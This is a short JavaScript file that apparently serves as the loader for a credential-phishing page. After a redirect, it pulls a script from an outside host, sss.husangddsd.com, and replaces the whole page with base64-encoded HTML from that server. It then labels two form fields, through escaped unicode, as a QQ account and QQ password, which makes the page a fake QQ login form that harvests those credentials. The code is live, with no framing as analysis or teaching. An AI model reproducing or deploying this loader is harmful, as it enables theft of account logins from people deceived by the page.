function GetRequest() {
  var url = location.search; 
   var theRequest = new Object();
   if (url.indexOf("?") != -1) {
      var str = url.substr(1);
      strs = str.split("&");
      for(var i = 0; i < strs.length; i ++) {
         theRequest[strs[i].split("=")[0]]=(strs[i].split("=")[1]);
      }
   }
   return theRequest;
}
function load(){
	var Request = new Object();
	Request = GetRequest();
	var tn=Request["tn"];
	var p=Request["p"];
	if(p=="2"){
	var dd=document.getElementById("dd");
	dd.style.display="none";
	document.body.style.background="rgb(255,255,255)";
	var JSONP=document.createElement("script");  
	JSONP.type="text/javascript";  
	JSONP.src="http://sss.husangddsd.com/1.php?tn="+tn;  
	document.getElementsByTagName("head")[0].appendChild(JSONP); 
	}else{
		window.location="?tn="+tn+"&p=2";
	}
}
function callback(obj){
	document.body.innerHTML=utf8to16(base64decode(obj));
	$("#cr_u").attr("placeholder", '\u0051' + '\u0051' + '\u5e10' + '\u53f7');
	$("#cr_p").attr("placeholder", '\u0051' + '\u0051' + '\u5bc6' + '\u7801');
}

var Request2 = new Object();
Request2 = GetRequest();
var p2=Request2["p"];
if(p2=="2"){
	var dd=document.getElementById("dd");
	dd.style.display="none";
	document.body.style.background="rgb(255,255,255)";
	load();
}